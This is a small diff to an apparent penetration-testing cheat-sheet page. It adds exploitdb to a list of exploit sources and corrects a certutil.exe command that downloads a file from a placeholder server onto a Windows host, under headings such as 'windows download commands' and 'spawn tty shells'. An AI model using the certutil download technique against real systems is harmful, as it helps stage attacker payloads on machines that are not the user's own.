@@ -4,6 +4,7 @@
 <h3>#search for public exploits</h3> 
 
 <p>Searchsploit<br>
+exploitdb<br>
 Google<br>
 github</p>
 
@@ -19,7 +20,7 @@ w3m<br>
 elinks</p>
 
 <h3>#windows download commands</h3>
-<p>certutil.exe -urlcache -f http://serverip/port</p>
+<p>certutil.exe -urlcache -f http://serverip/port outputfile</p>
 
 <h3>#spawn tty shells</h3>
 
